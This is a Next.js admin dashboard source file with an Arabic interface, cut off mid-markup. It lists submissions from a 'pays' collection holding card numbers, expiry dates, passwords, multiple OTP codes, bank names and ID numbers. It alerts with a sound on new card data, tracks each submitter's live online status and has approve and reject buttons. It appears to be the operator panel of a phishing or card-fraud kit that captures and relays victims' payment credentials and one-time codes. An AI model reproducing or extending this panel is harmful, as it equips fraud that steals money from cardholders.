"use client"

import type React from "react"

import { useState, useEffect, useMemo, useRef } from "react"
import { useRouter } from "next/navigation"
import {
  Trash2,
  Users,
  CreditCard,
  UserCheck,
  Flag,
  Bell,
  LogOut,
  CheckCircle,
  XCircle,
  Clock,
  MapPin,
  Search,
  Calendar,
  User,
  Menu,
  ChevronLeft,
  ChevronRight,
  MessageCircle,
  Send,
  Phone,
  Hash,
  Building,
  Shield,
  Paperclip,
  Smile,
  MoreVertical,
  X,
  Minimize2,
  Maximize2,
  Table,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { ar } from "date-fns/locale"
import { formatDistanceToNow, format } from "date-fns"
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { Card, CardContent, CardHeader, CardTitle, CardFooter } from "@/components/ui/card"
import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy, addDoc } from "firebase/firestore"
import { onAuthStateChanged, signOut } from "firebase/auth"
import { onValue, ref, serverTimestamp } from "firebase/database"
import { database } from "@/lib/firestore"
import { auth } from "@/lib/firestore"
import { db } from "@/lib/firestore"
import { playNotificationSound } from "@/lib/actions"
import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import { Input } from "@/components/ui/input"
import { DropdownMenu, DropdownMenuContent, DropdownMenuItem, DropdownMenuTrigger } from "@/components/ui/dropdown-menu"
import { Sheet, SheetContent, SheetHeader, SheetTitle } from "@/components/ui/sheet"
import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar"
import { Separator } from "@/components/ui/separator"
import { toast } from "@/hooks/use-toast"
import { Textarea } from "@/components/ui/textarea"
import { ScrollArea } from "@/components/ui/scroll-area"

// Flag colors for row highlighting
type FlagColor = "red" | "yellow" | "green" | null

// Chat message interface
interface ChatMessage {
  id: string
  senderId: string
  senderName: string
  senderType: "admin" | "user"
  message: string
  timestamp: any
  read: boolean
  type: "text" | "image" | "file"
  fileUrl?: string
  fileName?: string
}

// Chat conversation interface
interface ChatConversation {
  id: string
  userId: string
  userName: string
  userCountry?: string
  lastMessage: string
  lastMessageTime: any
  unreadCount: number
  isOnline: boolean
  messages: ChatMessage[]
}

function useOnlineUsersCount() {
  const [onlineUsersCount, setOnlineUsersCount] = useState(0)

  useEffect(() => {
    const onlineUsersRef = ref(database, "status")
    const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        const onlineCount = Object.values(data).filter((status: any) => status.state === "online").length
        setOnlineUsersCount(onlineCount)
      }
    })

    return () => unsubscribe()
  }, [])

  return onlineUsersCount
}

interface Notification {
  id: string
  address?: string
  allOtps?: string[]
  apartment?: string
  area?: string
  bank?: string
  bank_card?: string[]
  building?: string
  cardNumber?: string
  cardstate?: string
  country?: string
  createdDate: string
  floor?: string
  idNumber?: string
  month?: string
  name?: string
  network?: string
  notes?: string
  otp?: string
  otp2?: string
  pass?: string
  phone?: string
  phoneNumber?: string
  prefix?: string
  status: "pending" | "approved" | "rejected" | string
  year?: string
  flagColor?: FlagColor
  isHidden?: boolean
}


// User status component
function UserStatus({ userId }: { userId: string }) {
  const [status, setStatus] = useState<"online" | "offline" | "unknown">("unknown")

  useEffect(() => {
    const userStatusRef = ref(database, `/status/${userId}`)

    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        setStatus(data.state === "online" ? "online" : "offline")
      } else {
        setStatus("unknown")
      }
    })

    return () => unsubscribe()
  }, [userId])

  return (
    <Badge
      variant="outline"
      className={`
        ${
          status === "online"
            ? "bg-green-50 text-green-700 border-green-200 dark:bg-green-950 dark:text-green-300 dark:border-green-800"
            : "bg-red-50 text-red-700 border-red-200 dark:bg-red-950 dark:text-red-300 dark:border-red-800"
        } transition-all duration-300
      `}
    >
      <span
        className={`mr-1.5 inline-block h-2 w-2 rounded-full ${status === "online" ? "bg-green-500" : "bg-red-500"}`}
      ></span>
      <span className="text-xs font-medium">{status === "online" ? "متصل" : "غير متصل"}</span>
    </Badge>
  )
}

// Flag color selector component
function FlagColorSelector({
  notificationId,
  currentColor,
  onColorChange,
}: {
  notificationId: string
  currentColor: FlagColor
  onColorChange: (id: string, color: FlagColor) => void
}) {
  return (
    <Popover>
      <PopoverTrigger asChild>
        <Button variant="ghost" size="icon" className="h-8 w-8">
          <Flag
            className={`h-4 w-4 ${
              currentColor === "red"
                ? "text-red-500 fill-red-500"
                : currentColor === "yellow"
                  ? "text-yellow-500 fill-yellow-500"
                  : currentColor === "green"
                    ? "text-green-500 fill-green-500"
                    : "text-muted-foreground"
            }`}
          />
        </Button>
      </PopoverTrigger>
      <PopoverContent className="w-auto p-2">
        <div className="flex gap-2">
          <TooltipProvider>
            <Tooltip>
              <TooltipTrigger asChild>
                <Button
                  variant="ghost"
                  size="icon"
                  className="h-8 w-8 rounded-full bg-red-50 hover:bg-red-100 dark:bg-red-950 dark:hover:bg-red-900"
                  onClick={() => onColorChange(notificationId, "red")}
                >
                  <Flag className="h-4 w-4 text-red-500 fill-red-500" />
                </Button>
              </TooltipTrigger>
              <TooltipContent>
                <p>علم أحمر - أولوية عالية</p>
              </TooltipContent>
            </Tooltip>
          </TooltipProvider>

          <TooltipProvider>
            <Tooltip>
              <TooltipTrigger asChild>
                <Button
                  variant="ghost"
                  size="icon"
                  className="h-8 w-8 rounded-full bg-yellow-50 hover:bg-yellow-100 dark:bg-yellow-950 dark:hover:bg-yellow-900"
                  onClick={() => onColorChange(notificationId, "yellow")}
                >
                  <Flag className="h-4 w-4 text-yellow-500 fill-yellow-500" />
                </Button>
              </TooltipTrigger>
              <TooltipContent>
                <p>علم أصفر - أولوية متوسطة</p>
              </TooltipContent>
            </Tooltip>
          </TooltipProvider>

          <TooltipProvider>
            <Tooltip>
              <TooltipTrigger asChild>
                <Button
                  variant="ghost"
                  size="icon"
                  className="h-8 w-8 rounded-full bg-green-50 hover:bg-green-100 dark:bg-green-950 dark:hover:bg-green-900"
                  onClick={() => onColorChange(notificationId, "green")}
                >
                  <Flag className="h-4 w-4 text-green-500 fill-green-500" />
                </Button>
              </TooltipTrigger>
              <TooltipContent>
                <p>علم أخضر - تم المعالجة</p>
              </TooltipContent>
            </Tooltip>
          </TooltipProvider>

          {currentColor && (
            <TooltipProvider>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant="ghost"
                    size="icon"
                    className="h-8 w-8 rounded-full bg-gray-50 hover:bg-gray-100 dark:bg-gray-800 dark:hover:bg-gray-700"
                    onClick={() => onColorChange(notificationId, null)}
                  >
                    <Flag className="h-4 w-4 text-gray-500" />
                  </Button>
                </TooltipTrigger>
                <TooltipContent>
                  <p>إزالة العلم</p>
                </TooltipContent>
              </Tooltip>
            </TooltipProvider>
          )}
        </div>
      </PopoverContent>
    </Popover>
  )
}

// Mini chart component for statistics
function MiniChart({ data, color }: { data: number[]; color: string }) {
  const max = Math.max(...data)
  const min = Math.min(...data)
  const range = max - min || 1

  return (
    <div className="flex h-8 items-end gap-0.5">
      {data.map((value, index) => {
        const height = ((value - min) / range) * 100
        return (
          <div
            key={index}
            className={`w-1.5 rounded-sm ${color} transition-all duration-300`}
            style={{ height: `${Math.max(20, height)}%` }}
          ></div>
        )
      })}
    </div>
  )
}

// Search component
function SearchBar({ onSearch }: { onSearch: (term: string) => void }) {
  const [searchTerm, setSearchTerm] = useState("")

  const handleSearch = () => {
    onSearch(searchTerm)
  }

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Enter") {
      handleSearch()
    }
  }

  return (
    <div className="relative">
      <Search className="absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
      <Input
        type="search"
        placeholder="البحث في الإشعارات..."
        className="pl-10 pr-4 h-10 bg-background border-border focus:border-primary focus:ring-1 focus:ring-primary"
        value={searchTerm}
        onChange={(e) => setSearchTerm(e.target.value)}
        onKeyDown={handleKeyDown}
      />
    </div>
  )
}

// Pagination component
function Pagination({
  currentPage,
  totalPages,
  onPageChange,
}: {
  currentPage: number
  totalPages: number
  onPageChange: (page: number) => void
}) {
  return (
    <div className="flex items-center justify-center space-x-2 space-x-reverse">
      <Button
        variant="outline"
        size="sm"
        onClick={() => onPageChange(currentPage - 1)}
        disabled={currentPage <= 1}
        className="h-8"
      >
        <ChevronRight className="h-4 w-4" />
      </Button>

      <div className="flex items-center gap-1">
        {Array.from({ length: Math.min(5, totalPages) }, (_, i) => {
          let page:number|undefined
          if (totalPages <= 5) {
            page = i + 1
          } else if (currentPage <= 3) {
            page = i + 1
          } else if (currentPage >= totalPages - 2) {
            page = totalPages - 4 + i
          } else {
            page = currentPage - 2 + i
          }

          return (
            <Button
              key={page}
              variant={currentPage === page ? "default" : "outline"}
              size="sm"
              className="h-8 w-8 p-0"
              onClick={() => onPageChange(page)}
            >
              {page}
            </Button>
          )
        })}
      </div>

      <Button
        variant="outline"
        size="sm"
        onClick={() => onPageChange(currentPage + 1)}
        disabled={currentPage >= totalPages}
        className="h-8"
      >
        <ChevronLeft className="h-4 w-4" />
      </Button>
    </div>
  )
}

// Chat Panel Component
function ChatPanel({
  isOpen,
  onClose,
  notifications,
}: {
  isOpen: boolean
  onClose: () => void
  notifications: Notification[]
}) {
  const [conversations, setConversations] = useState<ChatConversation[]>([])
  const [selectedConversation, setSelectedConversation] = useState<ChatConversation | null>(null)
  const [newMessage, setNewMessage] = useState("")
  const [isMinimized, setIsMinimized] = useState(false)
  const [searchTerm, setSearchTerm] = useState("")
  const messagesEndRef = useRef<HTMLDivElement>(null)

  // Initialize conversations from notifications
  useEffect(() => {
    const initConversations = notifications
      .filter((n) => n.name || n.phone)
      .map((notification) => ({
        id: notification.id,
        userId: notification.id,
        userName: notification.name || notification.phone || "مستخدم غير معروف",
        userCountry: notification.country,
        lastMessage: "لا توجد رسائل",
        lastMessageTime: new Date(notification.createdDate),
        unreadCount: 0,
        isOnline: false,
        messages: [],
      }))

    setConversations(initConversations)
  }, [notifications])

  // Auto scroll to bottom when new messages arrive
  useEffect(() => {
    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" })
  }, [selectedConversation?.messages])

  // Send message function
  const sendMessage = async () => {
    if (!newMessage.trim() || !selectedConversation) return

    const message: ChatMessage = {
      id: Date.now().toString(),
      senderId: "admin",
      senderName: "مدير النظام",
      senderType: "admin",
      message: newMessage.trim(),
      timestamp: new Date(),
      read: true,
      type: "text",
    }

    // Update local state
    setConversations((prev) =>
      prev.map((conv) =>
        conv.id === selectedConversation.id
          ? {
              ...conv,
              messages: [...conv.messages, message],
              lastMessage: message.message,
              lastMessageTime: message.timestamp,
            }
          : conv,
      ),
    )

    setSelectedConversation((prev) =>
      prev
        ? {
            ...prev,
            messages: [...prev.messages, message],
            lastMessage: message.message,
            lastMessageTime: message.timestamp,
          }
        : null,
    )

    setNewMessage("")

    // Here you would typically save to Firebase
    try {
      await addDoc(collection(db, "chats", selectedConversation.id, "messages"), {
        ...message,
        timestamp: serverTimestamp(),
      })
    } catch (error) {
      console.error("Error sending message:", error)
    }
  }

  // Filter conversations based on search
  const filteredConversations = conversations.filter(
    (conv) =>
      conv.userName.toLowerCase().includes(searchTerm.toLowerCase()) ||
      conv.userCountry?.toLowerCase().includes(searchTerm.toLowerCase()),
  )

  if (!isOpen) return null

  return (
    <div className="fixed bottom-4 right-4 z-50">
      <Card
        className={`bg-background/95 backdrop-blur-xl border-border/50 shadow-2xl transition-all duration-300 ${
          isMinimized ? "w-80 h-16" : "w-96 h-[600px]"
        }`}
      >
        {/* Chat Header */}
        <CardHeader className="p-4 border-b border-border/50">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="bg-gradient-to-br from-blue-500 to-blue-600 p-2 rounded-lg">
                <MessageCircle className="h-5 w-5 text-white" />
              </div>
              <div>
                <h3 className="font-semibold text-lg">المحادثات</h3>
                <p className="text-xs text-muted-foreground">
                  {selectedConversation ? selectedConversation.userName : `${conversations.length} محادثة`}
                </p>
              </div>
            </div>
            <div className="flex items-center gap-1">
              <Button variant="ghost" size="icon" className="h-8 w-8" onClick={() => setIsMinimized(!isMinimized)}>
                {isMinimized ? <Maximize2 className="h-4 w-4" /> : <Minimize2 className="h-4 w-4" />}
              </Button>
              <Button variant="ghost" size="icon" className="h-8 w-8" onClick={onClose}>
                <X className="h-4 w-4" />
              </Button>
            </div>
          </div>
        </CardHeader>

        {!isMinimized && (
          <div className="flex h-[520px]">
            {/* Conversations List */}
            <div className={`${selectedConversation ? "w-1/3" : "w-full"} border-r border-border/50 flex flex-col`}>
              {/* Search */}
              <div className="p-3 border-b border-border/50">
                <div className="relative">
                  <Search className="absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
                  <Input
                    placeholder="البحث..."
                    className="pl-10 pr-3 h-8 text-sm"
                    value={searchTerm}
                    onChange={(e) => setSearchTerm(e.target.value)}
                  />
                </div>
              </div>

              {/* Conversations */}
              <ScrollArea className="flex-1">
                <div className="p-2 space-y-1">
                  {filteredConversations.map((conversation) => (
                    <div
                      key={conversation.id}
                      className={`p-3 rounded-lg cursor-pointer transition-all duration-200 hover:bg-muted/50 ${
                        selectedConversation?.id === conversation.id ? "bg-primary/10 border border-primary/20" : ""
                      }`}
                      onClick={() => setSelectedConversation(conversation)}
                    >
                      <div className="flex items-center gap-3">
                        <Avatar className="h-8 w-8">
                          <AvatarFallback className="bg-gradient-to-br from-blue-500 to-purple-600 text-white text-xs">
                            {conversation.userName.charAt(0)}
                          </AvatarFallback>
                        </Avatar>
                        <div className="flex-1 min-w-0">
                          <div className="flex items-center justify-between">
                            <p className="font-medium text-sm truncate">{conversation.userName}</p>
                            {conversation.unreadCount > 0 && (
                              <Badge className="bg-red-500 text-white h-5 w-5 p-0 text-xs rounded-full flex items-center justify-center">
                                {conversation.unreadCount}
                              </Badge>
                            )}
                          </div>
                          <div className="flex items-center justify-between">
                            <p className="text-xs text-muted-foreground truncate">{conversation.lastMessage}</p>
                            <span className="text-xs text-muted-foreground">
                              {format(conversation.lastMessageTime, "HH:mm")}
                            </span>
                          </div>
                          {conversation.userCountry && (
                            <div className="flex items-center gap-1 mt-1">
                              <MapPin className="h-3 w-3 text-muted-foreground" />
                              <span className="text-xs text-muted-foreground">{conversation.userCountry}</span>
                            </div>
                          )}
                        </div>
                      </div>
                    </div>
                  ))}

                  {filteredConversations.length === 0 && (
                    <div className="text-center py-8 text-muted-foreground">
                      <MessageCircle className="h-8 w-8 mx-auto mb-2 opacity-50" />
                      <p className="text-sm">لا توجد محادثات</p>
                    </div>
                  )}
                </div>
              </ScrollArea>
            </div>

            {/* Chat Messages */}
            {selectedConversation && (
              <div className="flex-1 flex flex-col">
                {/* Chat Header */}
                <div className="p-3 border-b border-border/50 bg-muted/20">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-3">
                      <Button
                        variant="ghost"
                        size="icon"
                        className="h-8 w-8 md:hidden"
                        onClick={() => setSelectedConversation(null)}
                      >
                        <ChevronRight className="h-4 w-4" />
                      </Button>
                      <Avatar className="h-8 w-8">
                        <AvatarFallback className="bg-gradient-to-br from-blue-500 to-purple-600 text-white text-xs">
                          {selectedConversation.userName.charAt(0)}
                        </AvatarFallback>
                      </Avatar>
                      <div>
                        <p className="font-medium text-sm">{selectedConversation.userName}</p>
                        <div className="flex items-center gap-2">
                          <UserStatus userId={selectedConversation.userId} />
                          {selectedConversation.userCountry && (
                            <span className="text-xs text-muted-foreground">{selectedConversation.userCountry}</span>
                          )}
                        </div>
                      </div>
                    </div>
                    <DropdownMenu>
                      <DropdownMenuTrigger asChild>
                        <Button variant="ghost" size="icon" className="h-8 w-8">
                          <MoreVertical className="h-4 w-4" />
                        </Button>
                      </DropdownMenuTrigger>
                      <DropdownMenuContent align="end">
                        <DropdownMenuItem>عرض الملف الشخصي</DropdownMenuItem>
                        <DropdownMenuItem>مسح المحادثة</DropdownMenuItem>
                        <DropdownMenuItem className="text-red-600">حظر المستخدم</DropdownMenuItem>
                      </DropdownMenuContent>
                    </DropdownMenu>
                  </div>
                </div>

                {/* Messages */}
                <ScrollArea className="flex-1 p-3">
                  <div className="space-y-3">
                    {selectedConversation.messages.length === 0 ? (
                      <div className="text-center py-8 text-muted-foreground">
                        <MessageCircle className="h-8 w-8 mx-auto mb-2 opacity-50" />
                        <p className="text-sm">ابدأ المحادثة</p>
                        <p className="text-xs">أرسل رسالة لبدء المحادثة مع {selectedConversation.userName}</p>
                      </div>
                    ) : (
                      selectedConversation.messages.map((message) => (
                        <div
                          key={message.id}
                          className={`flex ${message.senderType === "admin" ? "justify-end" : "justify-start"}`}
                        >
                          <div
                            className={`max-w-[80%] p-3 rounded-lg ${
                              message.senderType === "admin" ? "bg-primary text-primary-foreground" : "bg-muted"
                            }`}
                          >
                            <p className="text-sm">{message.message}</p>
                            <p
                              className={`text-xs mt-1 ${
                                message.senderType === "admin" ? "text-primary-foreground/70" : "text-muted-foreground"
                              }`}
                            >
                              {format(message.timestamp, "HH:mm")}
                            </p>
                          </div>
                        </div>
                      ))
                    )}
                    <div ref={messagesEndRef} />
                  </div>
                </ScrollArea>

                {/* Message Input */}
                <div className="p-3 border-t border-border/50">
                  <div className="flex items-center gap-2">
                    <Button variant="ghost" size="icon" className="h-8 w-8">
                      <Paperclip className="h-4 w-4" />
                    </Button>
                    <div className="flex-1 relative">
                      <Textarea
                        placeholder="اكتب رسالة..."
                        className="min-h-[40px] max-h-[120px] resize-none pr-10"
                        value={newMessage}
                        onChange={(e) => setNewMessage(e.target.value)}
                        onKeyDown={(e) => {
                          if (e.key === "Enter" && !e.shiftKey) {
                            e.preventDefault()
                            sendMessage()
                          }
                        }}
                      />
                      <Button variant="ghost" size="icon" className="absolute left-2 bottom-2 h-6 w-6">
                        <Smile className="h-4 w-4" />
                      </Button>
                    </div>
                    <Button onClick={sendMessage} disabled={!newMessage.trim()} className="h-10 w-10 p-0">
                      <Send className="h-4 w-4" />
                    </Button>
                  </div>
                </div>
              </div>
            )}
          </div>
        )}
      </Card>
    </div>
  )
}

export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<Notification[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(null)
  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
  const [totalVisitors, setTotalVisitors] = useState<number>(0)
  const [cardSubmissions, setCardSubmissions] = useState<number>(0)
  const [filterType, setFilterType] = useState<"all" | "card" | "online">("all")
  const [searchTerm, setSearchTerm] = useState("")
  const [currentPage, setCurrentPage] = useState(1)
  const [itemsPerPage] = useState(12)
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
  const [chatOpen, setChatOpen] = useState(false)
  const router = useRouter()
  const onlineUsersCount = useOnlineUsersCount()

  // Track online status for all notifications
  const [onlineStatuses, setOnlineStatuses] = useState<Record<string, boolean>>({})

  // Effect to track online status for all notifications
  useEffect(() => {
    const statusRefs: { [key: string]: () => void } = {}

    notifications.forEach((notification) => {
      const userStatusRef = ref(database, `/status/${notification.id}`)

      const callback = onValue(userStatusRef, (snapshot) => {
        const data = snapshot.val()
        setOnlineStatuses((prev) => ({
          ...prev,
          [notification.id]: data && data.state === "online",
        }))
      })

      statusRefs[notification.id] = callback
    })

    return () => {
      Object.values(statusRefs).forEach((unsubscribe) => {
        if (typeof unsubscribe === "function") {
          unsubscribe()
        }
      })
    }
  }, [notifications])

  // Filter and search notifications
  const filteredNotifications = useMemo(() => {
    let filtered = notifications

    if (filterType === "card") {
      filtered = filtered.filter((notification) => notification.cardNumber)
    } else if (filterType === "online") {
      filtered = filtered.filter((notification) => onlineStatuses[notification.id])
    }

    if (searchTerm) {
      const term = searchTerm.toLowerCase()
      filtered = filtered.filter(
        (notification) =>
          notification.name?.toLowerCase().includes(term) ||
          notification.phone?.toLowerCase().includes(term) ||
          notification.cardNumber?.toLowerCase().includes(term) ||
          notification.country?.toLowerCase().includes(term) ||
          notification.bank?.toLowerCase().includes(term) ||
          notification.address?.toLowerCase().includes(term),
      )
    }

    return filtered
  }, [filterType, notifications, onlineStatuses, searchTerm])

  // Paginate notifications
  const paginatedNotifications = useMemo(() => {
    const startIndex = (currentPage - 1) * itemsPerPage
    return filteredNotifications.slice(startIndex, startIndex + itemsPerPage)
  }, [filteredNotifications, currentPage, itemsPerPage])

  const totalPages = Math.max(1, Math.ceil(filteredNotifications.length / itemsPerPage))

  useEffect(() => {
    setCurrentPage(1)
  }, [filterType, searchTerm])

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push("/login")
      } else {
        const unsubscribeNotifications = fetchNotifications()
        return () => {
          unsubscribeNotifications()
        }
      }
    })

    return () => unsubscribe()
  }, [router])

  const fetchNotifications = () => {
    setIsLoading(true)
    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs
          .map((doc) => {
            const data = doc.data() as any
            return { id: doc.id, ...data }
          })
          .filter((notification: any) => !notification.isHidden) as Notification[]

        const hasNewCardInfo = notificationsData.some(
          (notification) =>
            notification.cardNumber && !notifications.some((n) => n.id === notification.id && n.cardNumber),
        )

        if (hasNewCardInfo) {
          playNotificationSound()
        }

        updateStatistics(notificationsData)
        setNotifications(notificationsData)
        setIsLoading(false)
      },
      (error) => {
        console.error("Error fetching notifications:", error)
        setIsLoading(false)
      },
    )

    return unsubscribe
  }

  const updateStatistics = (notificationsData: Notification[]) => {
    const totalCount = notificationsData.length
    const cardCount = notificationsData.filter((notification) => notification.cardNumber).length

    setTotalVisitors(totalCount)
    setCardSubmissions(cardCount)
  }

  const handleClearAll = async () => {
    setIsLoading(true)
    try {
      const batch = writeBatch(db)
      notifications.forEach((notification) => {
        const docRef = doc(db, "pays", notification.id)
        batch.update(docRef, { isHidden: true })
      })
      await batch.commit()
      setNotifications([])
      toast({
        title: "تم مسح جميع الإشعارات",
        description: "تم مسح جميع الإشعارات بنجاح",
      })
    } catch (error) {
      console.error("Error hiding all notifications:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء مسح الإشعارات",
        variant: "destructive",
      })
    } finally {
      setIsLoading(false)
    }
  }
  const handleTabel=()=>{
    router.push('/Tabel')
  }
  const handleDelete = async (id: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { isHidden: true })
      setNotifications(notifications.filter((notification) => notification.id !== id))
      toast({
        title: "تم مسح الإشعار",
        description: "تم مسح الإشعار بنجاح",
      })
    } catch (error) {
      console.error("Error hiding notification:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء مسح الإشعار",
        variant: "destructive",
      })
    }
  }

  const handleApproval = async (state: string, id: string) => {
    try {
      const targetPost = doc(db, "pays", id)
      await updateDoc(targetPost, {
        status: state,
      })
      toast({
        title: state === "approved" ? "تمت الموافقة" : "تم الرفض",
        description: state === "approved" ? "تمت الموافقة على الإشعار بنجاح" : "تم رفض الإشعار بنجاح",
      })
    } catch (error) {
      console.error("Error updating notification status:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث حالة الإشعار",
        variant: "destructive",
      })
    }
  }

  const handleLogout = async () => {
    try {
      await signOut(auth)
      router.push("/login")
    } catch (error) {
      console.error("Error signing out:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تسجيل الخروج",
        variant: "destructive",
      })
    }
  }

  const handleInfoClick = (notification: Notification, infoType: "personal" | "card") => {
    setSelectedNotification(notification)
    setSelectedInfo(infoType)
  }

  const closeDialog = () => {
    setSelectedInfo(null)
    setSelectedNotification(null)
  }

  const handleFlagColorChange = async (id: string, color: FlagColor) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { flagColor: color })

      setNotifications(
        notifications.map((notification) =>
          notification.id === id ? { ...notification, flagColor: color } : notification,
        ),
      )

      toast({
        title: "تم تحديث العلامة",
        description: color ? "تم تحديث لون العلامة بنجاح" : "تمت إزالة العلامة بنجاح",
      })
    } catch (error) {
      console.error("Error updating flag color:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث لون العلامة",
        variant: "destructive",
      })
    }
  }

  const getRowBackgroundColor = (flagColor: FlagColor) => {
    if (!flagColor) return ""

    const colorMap = {
      red: "bg-red-50/50 dark:bg-red-950/20 border-l-4 border-l-red-500",
      yellow: "bg-yellow-50/50 dark:bg-yellow-950/20 border-l-4 border-l-yellow-500",
      green: "bg-green-50/50 dark:bg-green-950/20 border-l-4 border-l-green-500",
    }

    return colorMap[flagColor]
  }

  const handleSearch = (term: string) => {
    setSearchTerm(term)
  }

  const handlePageChange = (page: number) => {
    setCurrentPage(page)
  }

  const handleChatWithUser = (notification: Notification) => {
    setChatOpen(true)
    // You can add logic here to automatically select the conversation
  }

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-background to-muted/20 flex items-center justify-center">
        <div className="flex flex-col items-center gap-4">
          <div className="h-12 w-12 animate-spin rounded-full border-4 border-primary border-t-transparent"></div>
          <div className="text-lg font-medium text-muted-foreground">جاري التحميل...</div>
        </div>
      </div>
    )
  }

  const cardCount = notifications.filter((n) => n.cardNumber).length
  const onlineCount = Object.values(onlineStatuses).filter(Boolean).length

  const visitorTrend = [5, 8, 12, 7, 10, 15, 13, 18, 14, 12]
  const cardTrend = [2, 3, 5, 4, 6, 8, 7, 9, 8, 6]
  const onlineTrend = [3, 4, 6, 5, 7, 8, 6, 9, 7, 5]

  return (
    <div dir="rtl" className="min-h-screen bg-gradient-to-br from-background to-muted/20">
      {/* Mobile menu */}
      <Sheet open={mobileMenuOpen} onOpenChange={setMobileMenuOpen}>
        <SheetContent side="right" className="w-[280px]" dir="rtl">
          <SheetHeader className="mb-6">
            <SheetTitle className="flex items-center gap-2 text-xl">
              <Bell className="h-6 w-6 text-primary" />
              <span>لوحة الإشعارات</span>
            </SheetTitle>
          </SheetHeader>
          <div className="space-y-6">
            <div className="flex items-center gap-4 p-4 bg-muted/50 rounded-lg">
              <Avatar className="h-12 w-12">
                <AvatarImage src="/placeholder.svg?height=48&width=48" alt="صورة المستخدم" />
                <AvatarFallback className="bg-primary text-primary-foreground">مد</AvatarFallback>
              </Avatar>
              <div>
                <p className="font-semibold">مدير النظام</p>
                <p className="text-sm text-muted-foreground">admin@example.com</p>
              </div>
            </div>
            <Separator />
            <nav className="space-y-2">
              <Button variant="ghost" className="w-full justify-start h-12" onClick={() => setMobileMenuOpen(false)}>
                <Bell className="mr-3 h-5 w-5" />
                الإشعارات
              </Button>
              <Button variant="ghost" className="w-full justify-start h-12" onClick={() => setChatOpen(true)}>
                <MessageCircle className="mr-3 h-5 w-5" />
                المحادثات
              </Button>
              <Button variant="ghost" className="w-full justify-start h-12 text-red-600" onClick={handleLogout}>
                <LogOut className="mr-3 h-5 w-5" />
                تسجيل الخروج
              </Button>
            </nav>
          </div>
        </SheetContent>
      </Sheet>

      {/* Chat Panel */}
      <ChatPanel isOpen={chatOpen} onClose={() => setChatOpen(false)} notifications={notifications} />

      <div className="mx-auto max-w-7xl">
        {/* Header */}
        <header className="border-b border-border/40 bg-background/80 backdrop-blur-xl supports-[backdrop-filter]:bg-background/60 sticky top-0 z-40">
          <div className="flex items-center justify-between p-6">
            <div className="flex items-center gap-4">
              <Button variant="ghost" size="icon" className="md:hidden" onClick={() => setMobileMenuOpen(true)}>
                <Menu className="h-5 w-5" />
              </Button>
              <div className="flex items-center gap-4">
                <div className="bg-gradient-to-br from-primary to-primary/80 p-3 rounded-xl shadow-lg">
                  <Bell className="h-6 w-6 text-primary-foreground" />
                </div>
                <div>
                  <h1 className="text-2xl font-bold bg-gradient-to-r from-foreground to-foreground/70 bg-clip-text text-transparent">
                    لوحة الإشعارات
                  </h1>
                  <p className="text-sm text-muted-foreground">إدارة ومتابعة الإشعارات</p>
                </div>
              </div>
            </div>

            <div className="flex items-center gap-3">
              <TooltipProvider>
                <Tooltip>
                  <TooltipTrigger asChild>
                    <Button
                      variant="outline"
                      size="icon"
                      onClick={() => setChatOpen(true)}
                      className="relative shadow-lg"
                    >
                      <MessageCircle className="h-4 w-4" />
                      {/* Notification badge for unread messages */}
                      <Badge className="absolute -top-2 -right-2 h-5 w-5 p-0 text-xs bg-red-500 text-white rounded-full flex items-center justify-center">
                        3
                      </Badge>
                    </Button>
                  </TooltipTrigger>
                  <TooltipContent>
                    <p>المحادثات</p>
                  </TooltipContent>
                </Tooltip>
              </TooltipProvider>

              <Button
                variant="default"
                onClick={handleTabel}
                className="hidden sm:flex items-center gap-2 shadow-lg"
              >
                <Table className="h-4 w-4" />
عرض الجدول              </Button>
              <Button
                variant="destructive"
                onClick={handleClearAll}
                disabled={notifications.length === 0}
                className="hidden sm:flex items-center gap-2 shadow-lg"
              >
                <Trash2 className="h-4 w-4" />
                مسح الكل
              </Button>

              <DropdownMenu>
                <DropdownMenuTrigger asChild>
                  <Button variant="ghost" className="relative h-10 w-10 rounded-full">
                    <Avatar className="h-10 w-10">
                      <AvatarImage src="/placeholder.svg?height=40&width=40" alt="صورة المستخدم" />
                      <AvatarFallback className="bg-primary text-primary-foreground">مد</AvatarFallback>
                    </Avatar>
                  </Button>
                </DropdownMenuTrigger>
                <DropdownMenuContent align="end" className="w-56">
                  <div className="flex items-center justify-start gap-2 p-2">
                    <div className="flex flex-col space-y-0.5 leading-none">
                      <p className="font-medium text-sm">مدير النظام</p>
                      <p className="text-xs text-muted-foreground">admin@example.com</p>
                    </div>
                  </div>
